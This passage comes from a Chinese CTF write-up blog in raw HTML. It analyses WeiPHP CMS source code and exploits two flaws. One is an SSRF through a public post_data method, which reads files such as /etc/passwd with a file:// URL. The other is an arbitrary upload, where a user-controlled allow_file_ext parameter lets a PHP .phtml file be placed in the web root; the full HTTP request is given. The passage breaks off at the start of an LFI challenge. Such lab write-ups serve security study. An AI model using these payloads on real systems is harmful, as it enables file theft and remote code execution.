class="line">            <span class="hljs-string">'curl_erron'</span> =&gt; $flat,</span><br><span class="line">            <span class="hljs-string">'curl_error'</span> =&gt; $msg</span><br><span class="line">        ];</span><br><span class="line">    } <span class="hljs-keyword">else</span> {</span><br><span class="line">        <span class="hljs-keyword">if</span> ($return_array &amp;&amp; !<span class="hljs-keyword">empty</span>($res)) {</span><br><span class="line">            $res = $type == <span class="hljs-string">'json'</span> ? json_decode($res, <span class="hljs-keyword">true</span>) : FromXml($res);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">return</span> $res;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>可以看到 common.php 中的没有什么过滤，所以我们只需要找引用 Base.php 当中的<code>post_data</code>函数的地方就行了。我们随便登录一下就可以发现其路由规则了，比如登录路由是<code>index.php/home/user/login</code>，对应的是<code>application/home/controller/User.php</code>当中的<code>login()</code>方法，而 Base.php 跟其他 controller 有以下继承关系：</p><p></p><figure class="highlight reasonml hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">home/controller/<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">User</span>.</span></span>php -&gt; home/controller/<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Home</span>.</span></span>php -&gt; common/controller/<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">WebBase</span>.</span></span>php -&gt; common/controller/<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base</span>.</span></span>php</span><br></pre></td></tr></tbody></table></figure><p></p><p>所以<code>post_data</code>为 public 方法也可以直接调用，所以根据<code>post_data</code>方法的参数，我们需要传入几个参数，<code>url</code>为 SSRF 的点，<code>param</code>随笔即可。</p><p>这里由于 cms 开启了 debug ，这里要把<code>type</code>参数设为<code>file</code>，让<code>post_data</code>函数在调用<code>FromXml</code>函数的时候，由于我们传入诸如<code>url=file:///etc/passwd</code>的参数，会导致<code>simple_xml_load_string</code>出错</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment"> * 将xml转为array</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">FromXml</span><span class="hljs-params">($xml)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">    <span class="hljs-keyword">if</span> (!$xml) {</span><br><span class="line">        <span class="hljs-keyword">exception</span>(<span class="hljs-string">"xml数据异常！"</span>);</span><br><span class="line">    }</span><br><span class="line">    file_log($xml, <span class="hljs-string">'FromXml'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// 解决部分json数据误入的问题</span></span><br><span class="line">    $arr = json_decode($xml, <span class="hljs-keyword">true</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span> (is_array($arr) &amp;&amp; !<span class="hljs-keyword">empty</span>($arr)) {</span><br><span class="line">        <span class="hljs-keyword">return</span> $arr;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-comment">// 将XML转为array</span></span><br><span class="line">    $arr = json_decode(json_encode(simplexml_load_string($xml, <span class="hljs-string">'SimpleXMLElement'</span>, LIBXML_NOCDATA)), <span class="hljs-keyword">true</span>);</span><br><span class="line">    <span class="hljs-keyword">return</span> $arr;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191109024547.png" alt=""></p><p>可以看到在图中已经拿到了文件内容回显，所以当时我们就用这个 SSRF 拿到了 flag</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191109020248.png" alt=""></p><h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p>在<code>application/home/controller/File.php</code>我们可以看到有这么一个方法</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/* 文件上传 到根目录 */</span></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_root</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">  $return = <span class="hljs-keyword">array</span>(</span><br><span class="line">    <span class="hljs-string">'status'</span> =&gt; <span class="hljs-number">1</span>,</span><br><span class="line">    <span class="hljs-string">'info'</span> =&gt; <span class="hljs-string">'上传成功'</span>,</span><br><span class="line">    <span class="hljs-string">'data'</span> =&gt; <span class="hljs-string">''</span></span><br><span class="line">  );</span><br><span class="line">  <span class="hljs-comment">/* 调用文件上传组件上传文件 */</span></span><br><span class="line">  $File = D(<span class="hljs-string">'home/File'</span>);</span><br><span class="line">  $file_driver = strtolower(config(<span class="hljs-string">'picture_upload_driver'</span>));</span><br><span class="line">  $setting = <span class="hljs-keyword">array</span> (</span><br><span class="line">    <span class="hljs-string">'rootPath'</span> =&gt; <span class="hljs-string">'./'</span> ,</span><br><span class="line">  );</span><br><span class="line">  $info = $File-&gt;upload($setting, config(<span class="hljs-string">'picture_upload_driver'</span>), config(<span class="hljs-string">"upload_{$file_driver}_config"</span>));</span><br><span class="line">  <span class="hljs-comment">//     	$info = $File-&gt;upload(config('download_upload'), config('picture_upload_driver'), config("upload_{$file_driver}_config"));</span></span><br><span class="line">  <span class="hljs-comment">/* 记录附件信息 */</span></span><br><span class="line">  <span class="hljs-keyword">if</span> ($info) {</span><br><span class="line">    $return[<span class="hljs-string">'status'</span>] = <span class="hljs-number">1</span>;</span><br><span class="line">    $return = array_merge($info[<span class="hljs-string">'download'</span>], $return);</span><br><span class="line">  } <span class="hljs-keyword">else</span> {</span><br><span class="line">    $return[<span class="hljs-string">'status'</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    $return[<span class="hljs-string">'info'</span>] = $File-&gt;getError();</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-comment">/* 返回JSON数据 */</span></span><br><span class="line">  <span class="hljs-keyword">return</span> json_encode($return);</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>其中是调用了<code>application/home/model/File.php</code>中的一个<code>upload</code>函数</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span><span class="hljs-params">($setting = [], $driver = <span class="hljs-string">'Local'</span>, $config = null, $isTest = false)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">true...</span><br><span class="line">  $info = upload_files($setting, $driver, $config, <span class="hljs-string">'download'</span>, $isTest);</span><br><span class="line">  ...</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>这个函数又调用了<code>application/common.php</code>当中的<code>upload_files</code>函数，然后我们可以发现又这么一段神奇的代码：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> ($type == <span class="hljs-string">'picture'</span>) {</span><br><span class="line">  <span class="hljs-comment">//图片扩展名验证 ，图片大小不超过20M</span></span><br><span class="line">  $checkRule[<span class="hljs-string">'ext'</span>] = <span class="hljs-string">'gif,jpg,jpeg,png,bmp'</span>;</span><br><span class="line">  $checkRule[<span class="hljs-string">'size'</span>] = <span class="hljs-number">20971520</span>;</span><br><span class="line">} <span class="hljs-keyword">else</span> {</span><br><span class="line">  $allowExt = input(<span class="hljs-string">'allow_file_ext'</span>, <span class="hljs-string">''</span>);</span><br><span class="line">  <span class="hljs-keyword">if</span> ($allowExt != <span class="hljs-string">''</span>) {</span><br><span class="line">    $checkRule[<span class="hljs-string">'ext'</span>] = $allowExt;</span><br><span class="line">  }</span><br><span class="line">  $allowSize = input(<span class="hljs-string">'allow_file_maxsize'</span>, <span class="hljs-string">''</span>);</span><br><span class="line">  <span class="hljs-keyword">if</span> ($allowSize &gt; <span class="hljs-number">0</span>) {</span><br><span class="line">    $checkRule[<span class="hljs-string">'size'</span>] = $allowSize;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>这里<code>input('allow_file_ext', '');</code>表示我们可以设置允许上传的类型…然后我们随便上传一个试试</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/weiphp/public/index.php/home/file/upload_root</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: zedd.vv</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------6593480186465200061941970669</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 480</span><br><span class="line"><span class="hljs-attribute">Origin</span>: http://zedd.vv</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Referer</span>: http://zedd.vv/upload.html</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: PHPSESSID=0cfb281c78e25924ebb7c8abe9084590</span><br><span class="line"><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">-----------------------------6593480186465200061941970669</span><br><span class="line"><span class="hljs-attribute">Content-Disposition</span>: form-data; name="name"; filename="1.phtml"</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: text/php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="hljs-attribute">phpinfo();?&gt;</span></span><br><span class="line"><span class="hljs-attribute">-----------------------------6593480186465200061941970669</span></span><br><span class="line"><span class="hljs-attribute">Content-Disposition</span>: form-data; name="allow_file_ext"</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">phtml</span></span><br><span class="line"><span class="hljs-attribute">-----------------------------6593480186465200061941970669</span></span><br><span class="line"><span class="hljs-attribute">Content-Disposition</span>: form-data; name="allow_file_maxsize"</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">1024</span></span><br><span class="line"><span class="hljs-attribute">-----------------------------6593480186465200061941970669--</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>虽然报错了但是我们依然上传成功了，直接访问那个路径即可。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191109134834.png" alt=""></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191109135000.png" alt=""></p><h2 id="lfi2019"><a href="#lfi2019" class="headerlink" title="lfi2019"></a>lfi2019</h2><p>在 header 头有一个提示可以拿到源码</p><p></p><figure class="highlight vim hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">X</span>-Hin<span class="hljs-variable">t:</span> /<span class="hljs-built_in">index</span>.php?show-<span 